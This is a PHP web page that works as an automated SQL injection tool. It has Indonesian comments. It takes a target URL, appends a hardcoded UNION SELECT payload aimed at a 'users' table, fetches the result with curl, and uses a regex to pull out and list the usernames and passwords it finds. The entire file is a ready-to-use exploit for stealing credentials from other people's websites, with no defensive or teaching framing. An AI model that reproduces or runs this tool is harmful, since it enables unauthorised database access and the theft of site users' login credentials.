<main class="app-content">
	<div class="app-title">
		<div>
          <h1><?= $jenis; ?></h1>
        </div>
        <ul class="app-breadcrumb breadcrumb">
          <a href="<?= base_url() ?>">
          	<li class="breadcrumb-item"><i class="fa fa-home fa-lg"></i></a></li>
          <li class="breadcrumb-item"><?= $title; ?></li>
        </ul>
      </div>
	</div>
	
	<div class="tile">
		<form method="post">
			<input type="url" name="lokmed" class="form-control" placeholder="Url Target" required="required">
			<button type="submit" name="query" class="btn btn-info btn-block mt-3">Start</button>
		</form>
	</div>
	
<?php
if(isset($_POST["query"])){
	$target = htmlspecialchars(addslashes($_POST["lokmed"]), ENT_QUOTES);
	$payload = "statis-1'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3c636f64653e,username,0x3c2f636f64653e,0x3c636f64653e,password,0x3c2f636f64653e)),@)--+-profil.html";

// Gagal grabing otak bokep berjalan:)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$target/$payload");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, false);
$hc = curl_exec($ch);
curl_close($ch);
$regex = preg_match_all("'<code>,(.*?),</code>'si",$hc,$data);
$perms = $data[1];
echo '<div class="tile"><h4 class="text-center">Result '.$target.'</h4><hr>';
foreach($perms as $key){
	$ay = "<li>".$key."</li>";
	echo $ay;
	}
	echo "</div>";
}else{
echo '<div class="tile text-center">
	<h4>About Tools</h4>
	<p>Mohon maaf jika username dan password tidak terpisah, maksudnya tidak kami beri keterangan mana yang password dan juga username.</p>
</div>';
} ?>
</main>